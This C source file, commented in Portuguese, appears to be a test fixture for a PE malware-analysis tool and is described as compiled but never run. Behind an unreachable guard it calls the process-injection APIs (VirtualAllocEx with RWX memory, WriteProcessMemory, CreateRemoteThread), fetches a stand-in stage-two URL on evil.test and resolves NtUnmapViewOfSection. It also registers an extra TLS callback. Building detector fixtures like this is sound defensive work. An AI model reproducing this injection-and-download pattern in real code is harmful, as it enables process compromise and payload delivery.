/* Programa de teste da analise de PE (item 7.1). Nunca e executado: so compilado e lido. */
#include <winsock2.h>
#include <windows.h>
#include <wininet.h>

static const char URL[] = "http://evil.test/stage2.bin";

static void NTAPI teste_tls(PVOID h, DWORD reason, PVOID reserved) {
  (void)h;
  (void)reason;
  (void)reserved;
}
/* Callback de TLS proprio, alem dos que o CRT do mingw ja registra. */
__attribute__((section(".CRT$XLF"), used)) PIMAGE_TLS_CALLBACK teste_tls_ptr = teste_tls;

int main(int argc, char **argv) {
  (void)argv;
  if (argc > 100) {
    HANDLE p = OpenProcess(PROCESS_ALL_ACCESS, FALSE, 4);
    LPVOID m = VirtualAllocEx(p, NULL, 4096, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    WriteProcessMemory(p, m, URL, sizeof URL, NULL);
    CreateRemoteThread(p, NULL, 0, (LPTHREAD_START_ROUTINE)m, NULL, 0, NULL);
    HINTERNET i = InternetOpenA("x", 0, NULL, NULL, 0);
    InternetOpenUrlA(i, URL, NULL, 0, 0, 0);
    WSADATA w;
    WSAStartup(0x202, &w);
    socket(AF_INET, SOCK_STREAM, 0);
    FARPROC f = GetProcAddress(LoadLibraryA("ntdll.dll"), "NtUnmapViewOfSection");
    return f != NULL;
  }
  MessageBoxA(NULL, "ok", "teste", 0);
  return 0;
}
